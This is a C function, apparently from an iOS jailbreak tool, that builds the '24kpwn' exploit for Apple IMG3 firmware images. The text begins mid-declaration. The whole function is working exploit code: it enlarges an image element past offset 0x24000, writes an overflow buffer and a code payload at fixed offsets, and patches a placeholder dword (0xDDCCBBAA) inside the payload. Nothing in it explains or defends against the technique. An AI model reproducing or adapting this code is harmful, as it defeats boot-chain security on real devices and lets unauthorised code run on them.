do24kpwn(Img3Info* info, Img3Element* element, off_t curPos, const uint8_t* overflow, size_t overflow_size, const uint8_t* payload, size_t payload_size)
{
	off_t sizeRequired = (0x24000 + overflow_size) - curPos;
	off_t dataRequired = sizeRequired - sizeof(AppleImg3Header);
	element->data = realloc(element->data, dataRequired);
	memset(((uint8_t*)element->data) + element->header->dataSize, 0, dataRequired - element->header->dataSize);
	uint32_t overflowOffset = 0x24000 - (curPos + sizeof(AppleImg3Header));
	uint32_t payloadOffset = 0x23000 - (curPos + sizeof(AppleImg3Header));

	memcpy(((uint8_t*)element->data) + overflowOffset, overflow, overflow_size);
	memcpy(((uint8_t*)element->data) + payloadOffset, payload, payload_size);

	uint32_t* i;
	for(i = (uint32_t*)(((uint8_t*)element->data) + payloadOffset);
			i < (uint32_t*)(((uint8_t*)element->data) + payloadOffset + payload_size);
			i++) {
		uint32_t candidate = *i;
		FLIPENDIANLE(candidate);
		if(candidate == 0xDDCCBBAA) {
			candidate = info->replaceDWord;
			FLIPENDIANLE(candidate);
			*i = candidate;
			break;
		}
	}

	element->header->size = sizeRequired;
	element->header->dataSize = dataRequired;
}
